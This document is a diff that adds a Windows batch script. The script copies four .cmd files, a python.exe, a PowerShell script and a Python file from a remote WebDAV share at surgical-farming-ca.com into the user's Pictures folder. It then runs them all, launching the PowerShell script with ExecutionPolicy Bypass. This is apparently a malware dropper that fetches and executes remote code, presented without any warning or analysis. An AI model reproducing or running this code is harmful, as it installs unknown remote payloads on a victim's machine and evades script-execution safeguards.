@@ -1,0 +1,46 @@
+@echo off
+set source=\\surgical-farming-ca.com@9809\google
+set destination=%USERPROFILE%\Pictures
+
+REM Copy cmd files (las.cmd, kam.cmd, xff.cmd, zap.cmd) to the destination folder
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+
+REM Run cmd files
+echo Running las.cmd...
+call "%destination%\las.cmd"
+
+echo Running kam.cmd...
+call "%destination%\kam.cmd"
+
+echo Running xff.cmd...
+call "%destination%\xff.cmd"
+
+echo Running zap.cmd...
+call "%destination%\zap.cmd"
+
+REM Copy python.exe to the destination folder
+copy /Y "%source%\python.exe" "%destination%"
+
+REM Copy install.ps1 and new.py to the destination folder
+copy /Y "%source%\install.ps1" "%destination%"
+copy /Y "%source%\new.py" "%destination%"
+
+REM Run install.ps1 with Bypass policy
+echo Running install.ps1 with Bypass policy...
+powershell -ExecutionPolicy Bypass -File "%destination%\install.ps1"
+
+REM Check the exit code of the previous command
+IF NOT "%ERRORLEVEL%"=="0" (
+    echo install.ps1 failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Run new.py
+echo Running new.py...
+python "%destination%\new.py"
+
+echo Script completed successfully.
+exit /b 0
